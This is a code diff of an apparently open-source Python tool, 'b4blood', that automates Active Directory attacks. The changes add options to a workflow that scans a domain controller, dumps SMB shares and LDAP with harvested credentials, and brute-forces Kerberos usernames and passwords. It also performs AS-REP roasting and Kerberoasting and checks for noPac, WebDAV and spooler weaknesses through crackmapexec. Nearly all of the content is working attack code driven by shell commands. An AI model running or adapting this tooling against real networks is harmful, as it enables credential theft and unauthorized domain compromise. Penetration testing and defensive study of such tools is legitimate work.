@@ -33,12 +33,13 @@ def parse_arg():
 	parser.add_argument("--internal", action="store_true", help="DHCP broadcast resquest, you must be physicaly on the network.")
 	parser.add_argument("--fast", action="store_true", help="no vuln scan, no anonymous smb dump for saving time.")
 	parser.add_argument("--nsd", action="store_true", help="no smb dump with creds for saving time.")
+	parser.add_argument("--nkb", action="store_true", help="no kerbruting valid users password for saving time.")
 	parser.add_argument("-U", help="Provide your own userlist to Kerbrute users. Default xato-net-10-million-usernames. b4blood --ip 192.168.0.8 -U users.txt")
 	parser.add_argument("-P", help="Provide your own passlist to Kerbrute users. Default rockyou.txt. b4blood --ip 192.168.0.8 -P pass.txt, b4blood --ip 192.168.0.8 -U users.txt -P pass.txt")
 	parser.add_argument("-i", help="Interface for internal scan")
 	args = parser.parse_args()	
 	#print(args) 
-	return args.ip, args.internal, args.U, args.P, args.i, args.fast, args.nsd
+	return args.ip, args.internal, args.U, args.P, args.i, args.fast, args.nsd, args.nkb
 
 def asrepHashCredExtract(hash):
     hash=hash.replace("\n","")
@@ -58,7 +59,7 @@ def dumpLdapDB(cont, ip_to_scan, domain_name):
 	for cred in cont:
 		user=cred.split(":")[0]
 		passw=cred.split(":")[1].replace("\n","")
-		printf(f" Dumping AD with {user}:{passw} --> ldap_from_{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt --fast",green)
+		printf(f" Dumping AD with {user}:{passw} --> ldap_from_{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt --fast"+white,green)
 		os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
 		os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{domain_name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	
 
@@ -93,7 +94,7 @@ print("https://github.com/moloch54/b4blood")
 print("2023 by Moloch\n")
 print()
 
-ip,internal,U,P,interface, fast, nsd = parse_arg()
+ip,internal,U,P,interface, fast, nsd , nkb= parse_arg()
 ip_to_scan = ip
 
 if ip_to_scan == None and internal==False:
@@ -252,7 +253,7 @@ ip_to_scan=re.findall(reg,ip_to_scan)[0]
 
 printf(f" scanning {ip_to_scan}", green)
 
-os.system(f'nmap {ip_to_scan} -p 22,88,139,389,445,2049,3268,3389,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
+os.system(f'nmap {ip_to_scan} -p 22,88,139,389,445,2049,3268,3389,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 443,3389 -sC -Pn >> nmap_scan.txt')
 os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')
 os.system("cat nmap_scan.txt | grep DNS_Computer_Name | awk '{print $3}' > CN.txt")
 
@@ -260,7 +261,7 @@ os.system("cat nmap_scan.txt | grep DNS_Computer_Name | awk '{print $3}' > CN.tx
 with open('DC.txt', 'r') as fichier:
 	contenu = fichier.readlines()
 if len(contenu) <=1:
-	printf(" port 3389 not open, scanning 389 for domain name",red)
+	printf(" port 3389 not open, scanning port 389 for domain name",red)
 	os.system(f"nmap {ip_to_scan} -p 389 -sV -Pn --open | grep '389/tcp'" + " | awk '{print $10}' | cut -d ',' -f1 >> DC.txt")
 	with open('DC.txt', 'r') as fichier:
 		contenu = fichier.readlines()
@@ -328,7 +329,7 @@ for item in contenu_nmap:
 		smb=1
 	if "5985/tcp" in item:
 		winrm=1
-	if "389/tcp" or "3268/tcp" in item:
+	if "389/tcp" and not "3389/tcp" or "3268/tcp" in item:
 		ldap=1
 	if "2049/tcp" in item:
 		nfs=1
@@ -410,7 +411,7 @@ if smb and not fast:
 				print(yellow+filename+white)
 			print()
 
-if ldap and U ==None:
+if ldap and U ==None and domain_name !="":
 	printf(' Looking for LDAP null bind',green)
 	a=domain_name.split(".")
 	b=""
@@ -519,7 +520,7 @@ if krb:
 
 	print("")
 	os.system('cat kerbrutelog.txt | grep VALID | cut -f2 | cut -d "@" -f1 | cut -d " " -f2 > valid_users.txt')
-	os.system("rm kerbrutelog.txt")
+	#os.system("rm kerbrutelog.txt")
 	
 
 	with open('valid_users.txt', 'r') as fichier:
@@ -536,7 +537,7 @@ if krb:
 			contenu = fichier.readlines()
 		if not contenu:
 
-			printf(f" AS-REP Roasting failed !", red)
+			printf(f" No AS-REP Roasting accounts", red)
 			os.system("rm kerberhashs.txt")
 		else:
 			printf(" Hash(es) found!",green)
@@ -572,9 +573,8 @@ if os.path.isfile(f'valid_users.txt'):
 	with open("valid_users.txt") as fichier:
 		contenu=fichier.readlines()
 
-print("")
-if len(contenu) !=0 and krb and not fast:
-	if not fast:
+if len(contenu) !=0 and krb:
+	if not nkb:
 		printf(" Bruteforcing passwords",green)
 		for i,user in enumerate(contenu):
 			print(i+1,user.replace("\n",""))
@@ -767,9 +767,14 @@ if len(contenu) !=0:
 	passw=contenu[0].split(":")[1].replace("\n","")
 	printf(" scanning Kerberoastable accounts:",green)
 	os.system(f"python {path_impacket}/GetUserSPNs.py -dc-ip {ip_to_scan} {domain_name}/{user}:{passw} | grep -v Impacket")
+	if smb:
+		printf(" scanning for noPac",green)
+		os.system(f"crackmapexec smb {ip_to_scan} -u {user} -p '{passw}' -M nopac")
+		printf(" scanning for Webdav", green)
+		os.system(f"crackmapexec smb {ip_to_scan} -u {user} -p '{passw}' -M webdav")
+		printf(" scanning for spooler",green)
+		os.system(f"crackmapexec smb {ip_to_scan} -u {user} -p '{passw}' -M spooler")
 
-	printf(" scanning for noPac",green)
-	os.system(f"crackmapexec smb {ip_to_scan} -u {user} -p '{passw}' -M nopac")
 
 if os.path.isdir("./smb_dump"):
 	os.chdir("./smb_dump")
